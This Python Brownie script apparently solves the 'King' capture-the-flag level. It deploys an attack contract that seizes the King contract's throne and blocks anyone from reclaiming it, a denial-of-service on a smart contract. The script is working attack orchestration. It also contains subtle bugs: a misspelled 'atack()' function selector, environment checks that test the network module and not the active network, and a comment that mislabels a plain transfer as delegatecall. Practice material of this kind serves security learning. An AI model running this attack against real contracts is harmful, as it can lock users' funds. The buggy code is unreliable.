"""
Task:
    Break the King game. Claim the kingship and prevent anyone from claiming it back.
Postmortem:
    http://www.kingoftheether.com/postmortem.html
"""

from brownie import network, config, KingOriginal, KingAttack, interface
from scripts.helpers import LOCAL_BLOCKCHAIN_ENVIRONMENTS, get_account

from web3 import Web3


def init_king_deployment(contract_to_deploy, contract_interface, instance_address=None, initial_value=Web3.toWei("0.001", "ether")):
    """
    If local network, the original King contract needs to be deployed. If already deployed, the get its instance.
    """
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        deploying_account = get_account(1)
        print("Deploying contract; deployer: {}".format(deploying_account))
        deployed_contract = contract_to_deploy.deploy({"from": deploying_account, "value": initial_value})
    else:
        deployed_contract_address = config["networks"][network.show_active()][instance_address]
        deployed_contract = contract_interface(deployed_contract_address)
    
    return deployed_contract


def attack_king_contract(attacking_contract, deployed_contract, amount_to_send, already_deployed_attacking_contract_address=None):
    hacking_account = get_account()

    if (already_deployed_attacking_contract_address == None) | (network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS):
        print("Deploying attack contract, deployer: {}".format(hacking_account))
        attack_contract_deployed = attacking_contract.deploy(
            deployed_contract.address, 
            {"from": hacking_account}
            )
        print("Performating attack, attacker: {}".format(hacking_account))
        attack = attack_contract_deployed.attack({"from": hacking_account, "value": amount_to_send})
    else:
        # if already deployed contract on the rinkeby testnet, you can use it (via delegatecall)
        print("Attack contract already deployed, thus performating attack, attacker: {}".format(hacking_account))
        data_to_send = Web3.keccak(text="atack()")[0:4].hex()
        attack = hacking_account.transfer(to=already_deployed_attacking_contract_address, amount=amount_to_send, data=data_to_send)


def claim_throne(claiming_account, king_contract, value_to_send):
    """
    Claiming throne by using its King game function transfer.
    """
    print("Claiming the throne..")
    claiming_account.transfer(king_contract.address, amount=value_to_send)
    

def main():
    # deploy king contract or get already existing
    king_contract = init_king_deployment(contract_to_deploy=KingOriginal, contract_interface=interface.IKing, instance_address="king_instance")
    original_king = king_contract._king()

    # claim throne before attack:
    if network in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        new_claimer = get_account(2)
        claim_throne(new_claimer, king_contract, Web3.toWei("0.005", "ether"))
        new_king = king_contract._king()

    # deploy attack contract and perform attack
    attack_king_contract(
        attacking_contract=KingAttack,
        deployed_contract = king_contract, 
        amount_to_send=Web3.toWei("0.11", "ether"),
        )
    king_attacker = king_contract._king()

    print("Original king: {}".format(original_king))
    if network in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        print("New king: {}".format(new_king))
    print("King Attacker: {}".format(king_attacker))

    if network in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        # try to reclaim throne -> it should fail
        claim_throne(new_claimer, king_contract, Web3.toWei("0.005", "ether"))